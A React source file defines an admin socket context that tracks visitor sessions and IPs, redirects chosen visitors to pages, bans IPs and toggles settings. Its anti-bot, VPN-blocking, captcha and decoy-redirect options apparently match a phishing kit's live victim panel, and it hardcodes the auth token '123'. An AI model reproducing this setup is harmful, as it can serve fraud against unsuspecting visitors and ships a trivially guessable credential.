import React, { createContext, useContext, useEffect, useState } from 'react';
import { io } from 'socket.io-client';

// Context creation
const AdminSocketContext = createContext(null);

// Get the server URL based on environment
const getServerUrl = () => {
  if (process.env.NODE_ENV === 'production') {
    return window.location.origin; // This will be your render.com URL
  }
  return 'http://localhost:3000'; // Local development
};

// Provider Component
function AdminSocketProvider({ children }) {
  const [socket, setSocket] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [sessions, setSessions] = useState([]);
  const [settings, setSettings] = useState({
    websiteEnabled: true,
    redirectUrl: 'https://google.com',
    vpnBlockEnabled: false,
    antiBotEnabled: false,
    defaultLandingPage: 'loading.html',
    captchaEnabled: false,
    showEmojis: false, 
    availablePages: []
  });
  const [bannedIPs, setBannedIPs] = useState(new Set());

  useEffect(() => {
    const serverUrl = getServerUrl();
    // Change '/admin' to match the new route structure
    const newSocket = io('/admin', {  // Remove the serverUrl concatenation
      transports: ['websocket', 'polling'],
      auth: { token: '123' },
      withCredentials: true,
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000
    });

    newSocket.on('connect', () => {
      console.log('Connected to admin socket');
      setIsConnected(true);
    });

    newSocket.on('disconnect', () => {
      console.log('Disconnected from admin socket');
      setIsConnected(false);
    });

    newSocket.on('session_created', (session) => {
      setSessions(prev => [...prev, session]);
    });

    newSocket.on('session_updated', (updatedSession) => {
      setSessions(prev => prev.map(session => 
        session.id === updatedSession.id ? updatedSession : session
      ));
    });

    newSocket.on('session_removed', (sessionId) => {
      console.log('Session removed:', sessionId);
      setSessions(prev => prev.filter(session => session.id !== sessionId));
    });

    newSocket.on('session_remove_success', ({ sessionId }) => {
      console.log('Session successfully removed:', sessionId);
      setSessions(prev => prev.filter(session => session.id !== sessionId));
    });

    newSocket.on('session_remove_error', ({ sessionId, error }) => {
      console.error('Failed to remove session:', sessionId, error);
    });

    newSocket.on('sessions_cleared', () => {
      console.log('All sessions cleared');
      setSessions([]);
    });

    newSocket.on('settings_updated', (newSettings) => {
      setSettings(newSettings);
    });

    newSocket.on('ip_banned', (ip) => {
      setBannedIPs(prev => new Set([...prev, ip]));
    });

    newSocket.on('ip_unbanned', (ip) => {
      setBannedIPs(prev => {
        const newSet = new Set(prev);
        newSet.delete(ip);
        return newSet;
      });
    });

    newSocket.on('init', (data) => {
      setSessions(data.sessions || []);
      setSettings(data.settings || {});
      setBannedIPs(new Set(data.bannedIPs || []));
    });

    newSocket.on('error', (error) => {
      console.error('Socket error:', error);
    });

    newSocket.on('connect_error', (error) => {
      console.error('Connection error:', error);
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, []);

  const value = {
    socket,
    isConnected,
    sessions,
    settings,
    bannedIPs,
    updateSettings: (newSettings) => {
      socket?.emit('update_settings', newSettings);
    },
    removeSession: (sessionId) => {
      socket?.emit('remove_session', { sessionId });
    },
    redirectUser: (sessionId, targetPage) => {
      socket?.emit('redirect_user', { sessionId, page: targetPage });
    },
    banIP: (ip) => {
      socket?.emit('ban_ip', ip);
    },
    unbanIP: (ip) => {
      socket?.emit('unban_ip', ip);
    },

    clearSessions: () => {
      console.log('Clearing all sessions');
      socket?.emit('clear_sessions');
    },
    getSession: (sessionId) => sessions.find(s => s.id === sessionId),
    isIPBanned: (ip) => bannedIPs.has(ip),
    getActiveSessions: () => sessions.filter(s => s.connected),
    getSessionCount: () => sessions.length,
    getActiveSessionCount: () => sessions.filter(s => s.connected).length,
    isSessionActive: (sessionId) => {
      const session = sessions.find(s => s.id === sessionId);
      return session?.connected || false;
    },
    getSessionIP: (sessionId) => {
      const session = sessions.find(s => s.id === sessionId);
      return session?.ip;
    },
    getSessionsByIP: (ip) => sessions.filter(s => s.ip === ip),
  };

  return (
    <AdminSocketContext.Provider value={value}>
      {children}
    </AdminSocketContext.Provider>
  );
}

// Hook definition
function useAdminSocket() {
  const context = useContext(AdminSocketContext);
  if (!context) {
    throw new Error('useAdminSocket must be used within an AdminSocketProvider');
  }
  return context;
}

// Named exports for both the Provider and hook
export { AdminSocketProvider, useAdminSocket };